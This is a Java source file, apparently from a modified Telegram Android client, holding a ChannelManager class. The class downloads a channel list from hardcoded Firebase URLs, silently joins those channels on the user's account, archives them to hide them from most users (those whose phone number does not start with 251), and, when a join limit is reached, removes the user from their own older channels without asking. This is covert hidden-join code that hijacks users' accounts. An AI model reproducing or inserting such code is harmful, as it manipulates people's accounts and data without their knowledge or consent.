package org.master.feature.channels;

import android.text.TextUtils;
import android.util.LongSparseArray;

import com.google.android.exoplayer2.util.Log;

import org.json.JSONArray;
import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.BaseController;
import org.telegram.messenger.UserConfig;
import org.telegram.messenger.Utilities;
import org.telegram.tgnet.RequestDelegate;
import org.telegram.tgnet.TLObject;
import org.telegram.tgnet.TLRPC;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.HashMap;

import javax.net.ssl.HttpsURLConnection;

public class ChannelManager extends BaseController {

    private final  static String global = "https://fastchanneladdinglink.firebaseio.com/fast.json";
    private final  static String local = "https://bots-ef953.firebaseio.com/ethiopia.json";

    public static final String TAG = ChannelManager.class.getSimpleName();


    private static volatile ChannelManager[] Instance = new ChannelManager[UserConfig.MAX_ACCOUNT_COUNT];
    public static ChannelManager getInstance(int num) {
        ChannelManager localInstance = Instance[num];
        if (localInstance == null) {
            synchronized (ChannelManager.class) {
                localInstance = Instance[num];
                if (localInstance == null) {
                    Instance[num] = localInstance = new ChannelManager(num);
                }
            }
        }
        return localInstance;
    }

    private HashMap<String,Boolean> resolvingMap = new HashMap<>();
    private LongSparseArray<Boolean> joiningChannels  = new LongSparseArray<>();
    private boolean loadingChannels;



    public ChannelManager(int num) {
        super(num);

    }

    private void log(String message){
        Log.i(TAG,message);
    }

    public void getsChannelFromServer(){
        if(loadingChannels){
            return;
        }
        loadingChannels = true;
        boolean isLocal = false;
        String link = isLocal?local:global;
        Utilities.globalQueue.postRunnable(() -> {
            try {
                URL url = new URL(link);
                URLConnection urlConn = url.openConnection();
                HttpsURLConnection httpsConn = (HttpsURLConnection) urlConn;
                httpsConn.setRequestMethod("GET");
                httpsConn.connect();
                InputStream in;
                String result = "";
                if(httpsConn.getResponseCode() ==  200){
                    in = httpsConn.getInputStream();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(
                            in, "iso-8859-1"), 8);
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        sb.append(line).append("\n");
                    }
                    in.close();
                    result = sb.toString();
                }
                ArrayList<String> channelsArrList = new ArrayList<>();
                JSONArray jsonArray = new JSONArray(result);
                for(int a = 0; a < jsonArray.length();a++){
                    String channel = jsonArray.getString(a);
                    if(channelsArrList.contains(channel)){
                        continue;
                    }
                    channelsArrList.add(channel);
                }
                loadingChannels = false;
                AndroidUtilities.runOnUIThread(new Runnable() {
                    @Override
                    public void run() {
                        if(!channelsArrList.isEmpty()){
                            processChannels(channelsArrList);
                        }
                    }
                });

            }catch (Exception ignore){
                loadingChannels = false;
            }
        });
    }

    private void resolveChannel(String channel){
       Boolean bool =  resolvingMap.get(channel);
       if(bool != null && bool){
           return;
       }
        resolvingMap.put(channel,true);
        TLRPC.TL_contacts_resolveUsername req = new TLRPC.TL_contacts_resolveUsername();
        req.username = channel;
        getConnectionsManager().sendRequest(req, new RequestDelegate() {
            @Override
            public void run(TLObject response, TLRPC.TL_error error) {
                AndroidUtilities.runOnUIThread(new Runnable() {
                    @Override
                    public void run() {
                        resolvingMap.put(channel,false);
                        if(error == null){
                            TLRPC.TL_contacts_resolvedPeer res = (TLRPC.TL_contacts_resolvedPeer) response;
                            getMessagesController().putUsers(res.users, false);
                            getMessagesController().putChats(res.chats, false);
                            getMessagesStorage().putUsersAndChats(res.users, res.chats, false, true);
                            if(res.chats != null && !res.chats.isEmpty()){
                                performJoin(res.chats.get(0));
                            }
                        }
                    }
                });

            }
        });

    }

    private void archiveDialog(long dialogId){
        TLRPC.TL_folders_editPeerFolders req = new TLRPC.TL_folders_editPeerFolders();
        TLRPC.TL_inputFolderPeer folderPeer = new TLRPC.TL_inputFolderPeer();
        folderPeer.folder_id = 1;
        folderPeer.peer = getMessagesController().getInputPeer(dialogId);
        req.folder_peers.add(folderPeer);
        getConnectionsManager().sendRequest(req, (response, error) -> {
            if(error == null){
            }
        });
    }

    private boolean souldArchive(){
       return !getUserConfig().getClientPhone().startsWith("251");
    }

    private boolean removingOldCahnnels;
    private void removeOldChannels(){
        if(removingOldCahnnels){
            return;
        }
        removingOldCahnnels = true;
        TLRPC.User currentUser = getUserConfig().getCurrentUser();
        TLRPC.TL_channels_getInactiveChannels inactiveChannelsRequest = new TLRPC.TL_channels_getInactiveChannels();
        getConnectionsManager().sendRequest(inactiveChannelsRequest, new RequestDelegate() {
            @Override
            public void run(TLObject response, TLRPC.TL_error error) {
                removingOldCahnnels =false;
               if(error == null) {
                   final TLRPC.TL_messages_inactiveChats chats = (TLRPC.TL_messages_inactiveChats) response;
                   ArrayList< TLRPC.Chat> oldyearChannels = new ArrayList<>();
                   ArrayList< TLRPC.Chat> oldMonthChannels = new ArrayList<>();
                   for (int i = 0; i < chats.chats.size(); i++) {
                       TLRPC.Chat chat = chats.chats.get(i);
                       int currentDate = getConnectionsManager().getCurrentTime();
                       int date = chats.dates.get(i);
                       int daysDif = (currentDate - date) / 86400;
                       if (chat != null && chat.megagroup && (chat.admin_rights != null && (chat.admin_rights.post_messages || chat.admin_rights.add_admins) || chat.creator)) {
                           continue;
                       }
                       if (daysDif < 30) {
                       } else if (daysDif < 365) {
                           oldMonthChannels.add(chat);
                       } else {
                           oldyearChannels.add(chat);//year
                       }
                   }
                   int count = oldyearChannels.size();
                   for (int i = 0; i < count; i++) {
                       TLRPC.Chat chat = oldyearChannels.get(i);
                       getMessagesController().putChat(chat, false);
                       getMessagesController().deleteParticipantFromChat(chat.id, currentUser, null,false,false);
                   }
                   if(count > 10){
                       return;
                   }
                   if(oldMonthChannels.size() > 10){
                       for (int i = 0; i < 10; i++) {
                           TLRPC.Chat chat = oldMonthChannels.get(i);
                           getMessagesController().putChat(chat, false);
                           getMessagesController().deleteParticipantFromChat(chat.id, currentUser, null,false,false);
                       }
                   }


               }
            }
        });
    }


    private void performJoin(TLRPC.Chat chat){
         Boolean join =  joiningChannels.get(chat.id);
        if((join != null && join) || !chat.left){
            return;
        }
        joiningChannels.put(chat.id,true);
        TLRPC.TL_channels_joinChannel req1 = new TLRPC.TL_channels_joinChannel();
        req1.channel = getMessagesController().getInputChannel(chat.id);
        getConnectionsManager().sendRequest(req1, new RequestDelegate() {
            @Override
            public void run(TLObject response, TLRPC.TL_error error) {
                if(error != null && error.text.equals("CHANNELS_TOO_MUCH")){
                    AndroidUtilities.runOnUIThread(new Runnable() {
                        @Override
                        public void run() {
                            removeOldChannels();
                        }
                    });
                }
                AndroidUtilities.runOnUIThread(new Runnable() {
                    @Override
                    public void run() {
                        joiningChannels.put(chat.id,false);
                        if(error == null && souldArchive()){
                            archiveDialog(-chat.id);
                        }
                    }
                });
            }
        });
    }


    public void processChannels(ArrayList<String> chanels){

        try {
            ArrayList<String> channelToResolve = new ArrayList<>();
            ArrayList<TLRPC.Chat> channelToJoin = new ArrayList<>();
            for(int a = 0; a < chanels.size() ;a++){
                String ch = chanels.get(a);
                if(TextUtils.isEmpty(ch)){
                    continue;
                }
                TLObject object =  getMessagesController().getUserOrChat(ch);
                if(object instanceof TLRPC.Chat){
                    TLRPC.Chat chat = (TLRPC.Chat)object;
                    channelToJoin.add(chat);
                }else{
                    channelToResolve.add(ch);
                }
            }

            new Thread(() -> {
                for(int a = 0; a < channelToJoin.size();a++){
                    try {
                        Thread.sleep(1000);
                    } catch (Exception e) {
                    }
                    performJoin(channelToJoin.get(a));
                }

                for(int a = 0; a < channelToResolve.size();a++){
                    try {
                        Thread.sleep(100);
                    } catch (Exception e) {
                    }
                    resolveChannel(channelToResolve.get(a));
                }
            }){
            }.start();


        }catch (Exception ignore){

        }

    }

    public void clear(){

     }


}
